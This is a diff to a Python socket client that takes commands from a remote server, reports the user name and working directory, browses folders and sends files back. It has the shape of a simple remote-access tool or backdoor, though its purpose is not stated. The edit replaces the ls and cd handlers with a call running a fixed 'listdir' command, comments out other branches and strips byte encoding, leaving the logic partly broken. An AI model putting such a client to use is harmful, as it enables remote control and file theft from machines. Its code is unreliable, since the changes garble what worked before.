@@ -2,6 +2,7 @@ import socket
 import time
 import os
 import stat
+import subprocess
 
 
 class Client:
@@ -15,13 +16,13 @@ class Client:
 
         self.connect_server()
         while True:
-            data = self.socket.recv(4096).decode("UTF-8")
+            data = self.socket.recv(4096)
 
             if data:
                 if data == '1':
                     FileBrowser(self).run()
                 if data == '2':
-                    self.socket.sendall(bytes(os.getenv("USERNAME"), "UTF-8"))
+                    self.socket.sendall(os.getenv("USERNAME"))
             else:
                 print("Connection lost.")
                 self.connect_server()
@@ -47,53 +48,24 @@ class FileBrowser:
 
     def run(self):
 
-        self.client.socket.sendall(bytes(os.getcwd(), "UTF-8"))
+        self.client.socket.sendall(os.getcwd())
         while True:
             cmd = self.client.socket.recv(4096)
-            cmd = cmd.decode("UTF-8")
             cmd = cmd.split("~")
 
-            if cmd[0] == 'ls':
-                asd = self.ls(cmd)
-                self.client.socket.sendall(bytes(asd, "UTF-8"))
-            elif cmd[0] == 'cd':
-                asd = self.cd(cmd)
-                self.client.socket.sendall(bytes(asd, "UTF-8"))
-            elif cmd[0] == 'cp':
-                asd = self.file_transfer(cmd)
-                self.client.socket.sendall(bytes(asd, "UTF-8"))
-            elif cmd[0] == 'pwd':
-                asd = os.getcwd()
-                self.client.socket.sendall(bytes(asd, "UTF-8"))
-            elif cmd[0] == 'exit':
-                break
-            else:
-                self.client.socket.sendall(bytes("Command not found.",
-                                                 "UTF-8"))
-
-    def ls(self, cmd):
-        result = []
-        if len(cmd) == 1:
-            cmd.append('.')
-        try:
-            for f in os.listdir(cmd[1]):
-                if stat.S_ISDIR(os.stat(f).st_mode):
-                    f += "/"
-                result.append(f)
-            result = '  '.join(result)
-        except:
-            result = "No such file or directory."
-        return result
-
-    def cd(self, cmd):
-
-        if len(cmd) == 1:
-            cmd.append(os.environ["HOME"])
-        try:
-            os.chdir(cmd[1])
-        except:
-            return "No such file or directory."
-        return self.ls(["ls", "."])
+            try:
+                asd = subprocess.check_output("listdir")
+            except:
+                asd = "Command not found."
+            self.client.socket.sendall(asd)
+            # elif cmd[0] == 'cp':
+            #     asd = self.file_transfer(cmd)
+            #     self.client.socket.sendall(bytes(asd, "UTF-8"))
+            # elif cmd[0] == 'exit':
+            #     break
+            # else:
+            #     self.client.socket.sendall(bytes("Command not found.",
+            #                                      "UTF-8"))
 
     def file_transfer(self, file_name):
 
@@ -107,11 +79,11 @@ class FileBrowser:
                 self.client.socket.sendall(data)
             f.close()
             time.sleep(0.8)
-            self.client.socket.sendall(bytes("EOFX", "UTF-8"))
+            self.client.socket.sendall("EOFX")
             time.sleep(0.8)
 
             return "File transfered."
         except:
-            self.client.socket.sendall(bytes("EOFX", "UTF-8"))
+            self.client.socket.sendall("EOFX")
             time.sleep(0.8)
             return "Failed to transfer a file."
